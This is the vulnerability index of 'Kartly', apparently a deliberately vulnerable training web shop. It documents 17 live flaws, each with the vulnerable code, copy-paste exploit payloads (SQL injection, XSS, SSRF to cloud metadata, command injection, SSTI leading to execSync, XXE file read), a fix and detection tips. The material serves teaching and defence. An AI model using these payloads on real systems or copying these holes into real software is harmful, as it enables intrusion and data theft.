# Kartly — Vulnerability Index (`VULNS.md`)

> The master index the content is written from. **If a vuln isn't in this file,
> it doesn't exist.** Every class gets the full six-part shape once it's live:
> **Where · Vulnerable code · Exploit (exact payload) · Impact · Fix (code) ·
> Detect (defender's view).**

**Status legend:** 🔴 pending (not yet introduced) · 🟠 live on `main` (documented + exploit test) · 🟢 fixed on `fix/<slug>` (PR open, fixed test passing)

> **Phase status:** Phase 3 in progress. **17 of 24 live:** #1–#17. Each has a
> passing exploit test in `server/tests/exploits/` and a saved artifact in
> `artifacts/`. The dangerous classes are sandboxed to the container per §7
> (decoys only). #18–#24 are still the secure Phase 2 baseline.

## Matrix

| # | Vuln class | Lives in | Fix branch | Status |
|---|-----------|----------|------------|--------|
| 1 | SQLi – UNION/data | `GET /api/search?q=` | `fix/sqli` | 🟠 live on `main` |
| 2 | SQLi – auth bypass | `POST /api/auth/login` | `fix/sqli-login` | 🟠 live on `main` |
| 3 | Blind SQLi (boolean/time) | `GET /api/products?sort=` | `fix/blind-sqli` | 🟠 live on `main` |
| 4 | Broken auth | login / register / seed | `fix/auth` | 🟠 live on `main` |
| 5 | Broken access control (IDOR) | `GET /api/orders/:id`, `/messages/:id` | `fix/idor` | 🟠 live on `main` |
| 6 | Privilege escalation | `/api/admin/*` | `fix/authz-admin` | 🟠 live on `main` |
| 7 | Mass assignment | `POST /api/auth/register` | `fix/mass-assignment` | 🟠 live on `main` |
| 8 | Stored XSS | reviews, bio, description, messages | `fix/stored-xss` | 🟠 live on `main` |
| 9 | Reflected XSS | search / server error / share page | `fix/reflected-xss` | 🟠 live on `main` |
| 10 | DOM XSS | client renders `location.hash`/param | `fix/dom-xss` | 🟠 live on `main` |
| 11 | CSRF | `PATCH /api/me` (profile/email) | `fix/csrf` | 🟠 live on `main` |
| 12 | SSRF | import-image-from-URL, avatar-from-URL | `fix/ssrf` | 🟠 live on `main` |
| 13 | Unrestricted file upload | avatar / product image | `fix/upload` | 🟠 live on `main` |
| 14 | Path traversal / LFI | `GET /download?file=` | `fix/path-traversal` | 🟠 live on `main` |
| 15 | Command injection (RCE) | admin export (`POST /api/admin/export`) | `fix/cmdi` | 🟠 live on `main` |
| 16 | SSTI | seller store-announcement template | `fix/ssti` | 🟠 live on `main` |
| 17 | XXE | bulk XML product import | `fix/xxe` | 🟠 live on `main` |
| 18 | Open redirect | `GET /login?returnTo=` | `fix/open-redirect` | 🔴 pending |
| 19 | JWT weaknesses | API auth | `fix/jwt` | 🔴 pending |
| 20 | Security misconfig | verbose errors, `/.env`, debug route | `fix/misconfig` | 🔴 pending |
| 21 | Sensitive data exposure | API returns `passwordHash`/tokens | `fix/data-exposure` | 🔴 pending |
| 22 | Business logic | checkout: qty/price/coupon | `fix/business-logic` | 🔴 pending |
| 23 | CORS misconfig | API CORS | `fix/cors` | 🔴 pending |
| 24 | No rate limiting | login, coupon, reset | `fix/rate-limit` | 🔴 pending |

---

## Detailed entries

Each entry is filled in when the vuln goes live on `main` (Phase 3). Until then
the placeholders below reserve the slot and record the plan.

<!-- Template — copy per vuln when introduced:
### N. <Vuln class>  — <status emoji>
- **Where:** file:line / endpoint
- **Vulnerable code:** ```ts …```
- **Exploit (copy-paste):** ```…```
- **Impact:** business framing (what an attacker gets, why it matters)
- **Fix:** `fix/<slug>` — ```ts …``` (the PR diff)
- **Detect:** how a defender spots it (log signature, scanner rule, code review tell)
- **Exploit test:** `server/tests/exploits/<name>.test.ts`
-->

### 1. SQLi – UNION/data — 🟠 live on `main`
- **Where:** `server/src/services/searchService.ts` → `GET /api/search?q=`
- **Vulnerable code:**
  ```ts
  const sql = `SELECT id, name, description, category FROM "Product"
               WHERE name ILIKE '%${q}%' OR description ILIKE '%${q}%' ...`;
  return prisma.$queryRawUnsafe(sql);
  ```
- **Exploit (copy-paste):**
  ```
  GET /api/search?q=' UNION SELECT id, email, "passwordHash", role::text FROM "User"-- 
  ```
  (URL-encode the value.) User `email` comes back in the `name` field and
  `passwordHash` in `description`.
- **Impact:** Full read of any table — here it dumps every customer's email and
  (because of #4) plaintext password. Total account takeover, incl. admin.
- **Fix (`fix/sqli`):** use a parameterized query — `prisma.$queryRaw\`... ILIKE ${'%'+q+'%'}\`` or Prisma's `findMany` with `contains`. Never concatenate input into SQL.
- **Detect:** grep for `$queryRawUnsafe` / string-built SQL; WAF sees `UNION SELECT`; DB logs show a `UNION` against `"User"` from the search path.
- **Exploit test:** `server/tests/exploits/01-sqli-search.test.ts`

### 2. SQLi – auth bypass — 🟠 live on `main`
- **Where:** `server/src/services/authService.ts` → `POST /api/auth/login`
- **Vulnerable code:**
  ```ts
  const rows = await prisma.$queryRawUnsafe<User[]>(
    `SELECT * FROM "User" WHERE email = '${input.email}' AND "passwordHash" = '${input.password}'`,
  );
  ```
  (The login Zod schema is also loosened — no `.email()` — so the payload gets through, per §2 "Zod loose on main".)
- **Exploit (copy-paste):**
  ```
  POST /api/auth/login
  { "email": "admin@kartly.test'-- ", "password": "anything" }
  ```
  The `'-- ` closes the string and comments out the password check → logs in as admin.
- **Impact:** Authentication bypass. Any known email → full session as that user, including admin, with no password.
- **Fix (`fix/sqli-login`):** parameterized lookup by email + restore strict validation, then verify a hashed password in code (`fix/auth` supplies the hash).
- **Detect:** raw SQL in the auth path; login succeeding with a quote/`--` in the email field; failed-login count that doesn't match successes.
- **Exploit test:** `server/tests/exploits/02-sqli-login-bypass.test.ts`

### 3. Blind SQLi (boolean/time) — 🟠 live on `main`
- **Where:** `server/src/data/productRepo.ts` → `GET /api/products?sort=`
- **Vulnerable code:**
  ```ts
  const orderBy = sort?.trim() || '"createdAt" DESC';
  const sql = `SELECT * FROM "Product" WHERE (...) ORDER BY ${orderBy}`;
  return prisma.$queryRawUnsafe(sql, `%${q}%`, category);
  ```
  (q/category are parameterized; only `sort` is concatenated — the injection is isolated to ORDER BY.)
- **Exploit (copy-paste):**
  ```
  GET /api/products?sort=(SELECT 1 FROM pg_sleep(3))        → ~3s delay (time-based)
  GET /api/products?sort=(CASE WHEN (SELECT substr(passwordHash,1,1) FROM "User" WHERE email='admin@kartly.test')='a' THEN name ELSE (SELECT 1 FROM pg_sleep(3)) END)
  ```
- **Impact:** No direct output, but boolean/time oracles extract any data one bit at a time (password hashes, secrets).
- **Fix (`fix/blind-sqli`):** allowlist the sort column → concrete `ORDER BY`; never interpolate the raw value.
- **Detect:** raw value in ORDER BY; response-time spikes correlated with `pg_sleep`/`CASE` in `sort`.
- **Exploit test:** `server/tests/exploits/03-blind-sqli.test.ts`

### 4. Broken auth — 🟠 live on `main`
- **Where:** `server/prisma/seed.ts`, `authService.register` / `resetPassword` (plaintext storage), no lockout.
- **Vulnerable code:**
  ```ts
  function hashPassword(plain: string): string { return plain; } // seed
  // register/reset:
  passwordHash: input.password,
  ```
- **Exploit:** dump `passwordHash` via #1 → it *is* the password (`alice1234`, not a hash). Combined with unlimited attempts (see #24) this is trivial credential compromise.
- **Impact:** A DB read (backup, SQLi, insider) exposes every password directly; password reuse spreads the breach to users' other sites.
- **Fix (`fix/auth`):** store a strong KDF hash (argon2id/bcrypt/scrypt), constant-time verify, account lockout / throttling.
- **Detect:** passwords readable as cleartext in the DB; no `$`-prefixed hash format; no lockout after repeated failures.
- **Exploit test:** `server/tests/exploits/04-broken-auth-plaintext.test.ts`

> **Note (introduction commit):** #2 and #4 were introduced in a single commit
> because the raw-SQL login only functions over plaintext credentials — splitting
> them yields an intermediate commit where no one can log in. They remain
> separate rows and separate fix branches (`fix/sqli-login`, `fix/auth`).
### 5. Broken access control (IDOR) — 🟠 live on `main`
- **Where:** `server/src/services/orderService.ts` (`getById`), `messageService.ts` (`getById`) → `GET /api/orders/:id`, `GET /api/messages/:id`
- **Vulnerable code:** the `customerId === userId` / participant check is removed — only existence is checked.
- **Exploit:** as alice, `GET /api/orders/o-bob-1` → 200 returns bob's order; likewise any `/api/messages/:id`.
- **Impact:** Any logged-in user reads every order and private message by enumerating ids — order history, addresses, DMs.
- **Fix (`fix/idor`):** object-level authorization — verify ownership, return **404** (not 403) so ids don't leak existence.
- **Detect:** handlers that fetch by id without an owner predicate; one account reading many distinct ids.
- **Exploit test:** `server/tests/exploits/05-idor.test.ts`

### 6. Privilege escalation — 🟠 live on `main`
- **Where:** `server/src/routes/adminApi.ts` → `/api/admin/*`
- **Vulnerable code:** router uses `requireAuth` only — no `requireRole('ADMIN')`.
- **Exploit:** as a CUSTOMER, `GET /api/admin/users` → 200 (full user list); `POST /api/admin/users/u-alice/role {"role":"ADMIN"}` self-promotes.
- **Impact:** Any authenticated user gains admin capabilities — read all users, change roles, full takeover.
- **Fix (`fix/authz-admin`):** add `requireRole('ADMIN')` to the admin router (deny by default).
- **Detect:** admin routes lacking a role check; non-admin principals hitting `/api/admin/*`.
- **Exploit test:** `server/tests/exploits/06-privesc.test.ts`

### 7. Mass assignment — 🟠 live on `main`
- **Where:** `server/src/schemas/authSchemas.ts` (`.passthrough()`), `authService.register` (spreads body) → `POST /api/auth/register`
- **Vulnerable code:**
  ```ts
  const { email, name, password, ...rest } = input;
  await prisma.user.create({ data: { ...rest, email, name, passwordHash: password } });
  ```
- **Exploit:** `POST /api/auth/register {"email":"…","password":"…","name":"…","role":"ADMIN"}` → account created as ADMIN.
- **Impact:** Self-service privilege escalation at signup; any attacker mints an admin account.
- **Fix (`fix/mass-assignment`):** drop `.passthrough()` and construct the create from an explicit field allowlist (Zod `.pick`), never spreading the body.
- **Detect:** `{...req.body}` into ORM create/update; a signup setting a privileged field.
- **Exploit test:** `server/tests/exploits/07-mass-assignment.test.ts`
### 8. Stored XSS — 🟠 live on `main`
- **Where:** `server/src/views/share.ejs` (renders `product.description` and each `review.body` with `<%- %>`), fed by `pageController.shareProduct` → `GET /share/product/:id`
- **Vulnerable code:** `<p class="muted"><%- r.body %></p>` — raw HTML output of user-supplied review text.
- **Exploit (copy-paste):**
  ```
  POST /api/products/p01/reviews  { "body": "<img src=x onerror=alert(document.domain)>", "rating": 5 }
  GET  /share/product/p01         → the <img onerror> is served raw
  ```
- **Impact:** Persistent XSS running for every visitor of a public page — session/cookie theft, drive-by actions as the victim.
- **Fix (`fix/stored-xss`):** escape on output (`<%= %>`) / sanitize with DOMPurify; strict CSP as defense-in-depth.
- **Detect:** `<%-` on user-controlled data; scanner sees the stored payload reflected; CSP-violation reports.
- **Exploit test:** `server/tests/exploits/08-stored-xss.test.ts`

### 9. Reflected XSS — 🟠 live on `main`
- **Where:** `server/src/views/share.ejs` → `GET /share/product/:id?q=`
- **Vulnerable code:** `Results for "<%- q %>"` — the search term echoed as raw HTML.
- **Exploit (copy-paste):**
  ```
  GET /share/product/p01?q=<script>alert(1337)</script>   → script runs
  ```
- **Impact:** A crafted link executes attacker JS under the Kartly origin (phishing, token theft).
- **Fix (`fix/reflected-xss`):** contextual escaping (`<%= q %>`).
- **Detect:** reflected input in the response verbatim; `<%-` on request params.
- **Exploit test:** `server/tests/exploits/09-reflected-xss.test.ts`

### 10. DOM XSS — 🟠 live on `main`
- **Where:** `server/src/views/share.ejs` inline script → assigns the URL fragment via `innerHTML`.
- **Vulnerable code:**
  ```js
  var note = decodeURIComponent(location.hash.slice(1));
  if (note) document.getElementById("kartly-share-note").innerHTML = note;
  ```
- **Exploit (copy-paste):**
  ```
  https://…/share/product/p01#<img src=x onerror=alert(document.cookie)>
  ```
  The fragment never leaves the browser, so server-side filtering can't see it.
- **Impact:** Client-side XSS driven entirely by the URL fragment; same blast radius as reflected XSS but invisible to server logs/WAF.
- **Fix (`fix/dom-xss`):** write to `textContent` (inert sink); never pass untrusted data to `innerHTML`.
- **Detect:** `innerHTML`/`document.write` fed by `location.*`; DOM-XSS scanners; code review of client sinks.
- **Exploit test:** `server/tests/exploits/10-dom-xss.test.ts`
### 11. CSRF — 🟠 live on `main`
- **Where:** `server/src/routes/me.ts` → `PATCH /api/me` (profile/email update).
- **Vulnerable code:** the route dropped `csrfGuard` — `meRouter.patch("/", validate(updateMeSchema), userController.updateMe)`. Auth is via a `SameSite=Lax` cookie, and a top-level `PATCH`/form navigation still carries it.
- **Exploit:** an attacker page auto-submits `PATCH /api/me` with the victim's cookie and **no** `X-CSRF-Token` → 200, profile changed.
- **Impact:** Cross-site state change on the victim's account (e.g. change email → password-reset takeover).
- **Fix (`fix/csrf`):** restore `csrfGuard` (double-submit token) on all cookie-authed state-changing routes; keep `SameSite`.
- **Detect:** state-changing route with no CSRF/token check; writes lacking the `X-CSRF-Token` header succeeding.
- **Exploit test:** `server/tests/exploits/11-csrf.test.ts`
### 12. SSRF — 🟠 live on `main`
- **Where:** `server/src/services/userService.ts` (`setAvatarFromUrl`), `sellerService.ts` (`setImageFromUrl`) → `POST /api/me/avatar-url`, `POST /api/seller/products/:id/import-url`. Vulnerable fetch in `server/src/lib/urlFetch.ts` (`fetchUrlUnsafe`).
- **Vulnerable code:** `fetchUrlUnsafe` fetches the raw URL with **no** host validation (no private/loopback/link-local block); the bytes are saved via `saveRawBuffer` and served from `/uploads`.
- **Exploit (copy-paste):**
  ```
  POST /api/me/avatar-url { "url": "http://127.0.0.1:4000/api/health" }   → response saved to /uploads/<hex>.txt
  GET  /uploads/<hex>.txt                                                 → {"status":"ok","db":"up",…}
  ```
  Real-world target: `http://169.254.169.254/latest/meta-data/…` (cloud metadata) or internal admin/DB ports.
- **Impact:** Read internal-only services / cloud metadata; pivot into the internal network from the server's vantage point.
- **Fix (`fix/ssrf`):** `fetchRemoteImage` — allow only http/https, resolve DNS and block private/loopback/link-local ranges, cap size/time, require an image content-type.
- **Detect:** server-side `fetch()` of user input with no egress allowlist; outbound requests to RFC1918 / 169.254.169.254.
- **Sandbox (§7):** container-only; no real cloud metadata or outbound egress is wired; demo hits loopback.
- **Exploit test:** `server/tests/exploits/12-ssrf.test.ts`

### 13. Unrestricted file upload — 🟠 live on `main`
- **Where:** `server/src/lib/upload.ts` (`saveUnrestrictedUpload`), used by `userService.setAvatarFromUpload` / `sellerService.setImageFromUpload` → `POST /api/me/avatar`, `POST /api/seller/products/:id/image`.
- **Vulnerable code:** no magic-byte/MIME/content check; the client extension is preserved and the file lands in the web-readable uploads dir.
- **Exploit (copy-paste):**
  ```
  POST /api/me/avatar  (multipart)  filename=pwn.html  Content-Type=text/html
    body = <script>alert(document.domain)</script>
  → /uploads/<hex>.html  served as text/html
  ```
- **Impact:** Stored XSS / phishing page hosted on the trusted origin; with a permissive server, potential webshell.
- **Fix (`fix/upload`):** `saveValidatedImage` — verify by magic bytes (not MIME/extension), randomize the name, force a safe extension, serve from a non-executable dir.
- **Detect:** uploads trusting client MIME/extension; non-image bytes in the image store; active content types under `/uploads`.
- **Exploit test:** `server/tests/exploits/13-upload.test.ts`
### 14. Path traversal / LFI — 🟠 live on `main`
- **Where:** `server/src/controllers/pageController.ts` (`download`) → `GET /download?file=`.
- **Vulnerable code:** `const target = join(DOWNLOADS_DIR, file)` — the user filename is joined with no confinement, so `..` escapes the base.
- **Exploit (copy-paste):**
  ```
  GET /download?file=../decoys/secret.txt   → returns the file outside downloads/
  ```
- **Impact:** Read arbitrary files the process can access (config, keys, source).
- **Fix (`fix/path-traversal`):** `resolveWithinBase` — resolve the joined path and confirm it still sits inside the base dir.
- **Detect:** `path.join(base, userInput)` served without a containment check; `..`/encoded traversal in `file=`.
- **Sandbox (§7):** demo reads a planted decoy; container-only.
- **Exploit test:** `server/tests/exploits/14-path-traversal.test.ts`
### 15. Command injection (RCE) — 🟠 live on `main`
- **Where:** `server/src/controllers/adminApiController.ts` (`exportReport`) → `POST /api/admin/export`.
- **Vulnerable code:** `pexec(\`echo Kartly export ${label} && ls server/downloads | wc -l\`)` — the user `label` is concatenated into a shell command run via `child_process.exec`.
- **Exploit (copy-paste):**
  ```
  POST /api/admin/export { "label": "sales; cat server/decoys/secret.txt" }
  → output includes the decoy file contents (FLAG…)
  ```
- **Impact:** Arbitrary command execution as the app user — full host (container) compromise.
- **Fix (`fix/cmdi`):** `execFile("echo", [label])` — no shell, argument array, allowlisted binary; never string-concatenate into a shell.
- **Detect:** `exec()`/`sh -c` with interpolated input; shell metacharacters (`;`, `|`, `` ` ``, `$(`) in a parameter that reaches a command.
- **Sandbox (§7):** targets harmless bundled binaries (`echo`/`ls`) + a decoy file; container-only.
- **Exploit test:** `server/tests/exploits/15-cmdi.test.ts`
### 16. SSTI — 🟠 live on `main`
- **Where:** `server/src/controllers/pageController.ts` (`store`) compiles the announcement; `server/src/views/store.ejs` emits it raw → `GET /store/:sellerId`.
- **Vulnerable code:** `ejs.render(template, {})` — the seller-supplied announcement string is compiled as a template instead of rendered as data.
- **Exploit (copy-paste):**
  ```
  announcement = math=<%= 7*7 %> secret=<%= process.env.JWT_ACCESS_SECRET %>
  GET /store/u-seller  → "math=49 secret=dev-access-secret-change-me"
  ```
  Escalates to RCE via `<%- process.mainModule.require('child_process').execSync('id') %>`.
- **Impact:** Server secret disclosure and remote code execution in the app process.
- **Fix (`fix/ssti`):** never compile user input — render the announcement as escaped **data** (`<%= announcement %>`).
- **Detect:** user strings passed to a template compiler/`eval`; `<%`/`{{ }}` payloads surviving into rendered output.
- **Exploit test:** `server/tests/exploits/16-ssti.test.ts`
### 17. XXE — 🟠 live on `main`
- **Where:** `server/src/lib/xml.ts` (`parseProductXmlUnsafe`), used by `sellerService.importXml` → `POST /api/seller/products/import-xml`.
- **Vulnerable code:** DTDs are allowed and external `SYSTEM` entities are resolved off disk, then substituted into the document.
- **Exploit (copy-paste):**
  ```xml
  <!DOCTYPE products [<!ENTITY xxe SYSTEM "file:///app/server/decoys/secret.txt">]>
  <products><product><name>&xxe;</name><description>x</description><price>1</price><stock>1</stock></product></products>
  ```
  The imported product's `name` is populated with the file contents.
- **Impact:** Arbitrary file read (config, keys), SSRF via `http://` entities, and DoS (billion laughs).
- **Fix (`fix/xxe`):** `parseProductXml` — disable DTD/entity processing and reject any `<!DOCTYPE>`/`<!ENTITY>`.
- **Detect:** XML parser with entity/DTD resolution enabled; imports containing `<!ENTITY … SYSTEM …>`.
- **Sandbox (§7):** demo reads a planted decoy (`server/decoys/secret.txt`); container-only.
- **Exploit test:** `server/tests/exploits/17-xxe.test.ts`
### 18. Open redirect — 🔴 pending
### 19. JWT weaknesses — 🔴 pending
### 20. Security misconfig — 🔴 pending
### 21. Sensitive data exposure — 🔴 pending
### 22. Business logic — 🔴 pending
### 23. CORS misconfig — 🔴 pending
### 24. No rate limiting — 🔴 pending
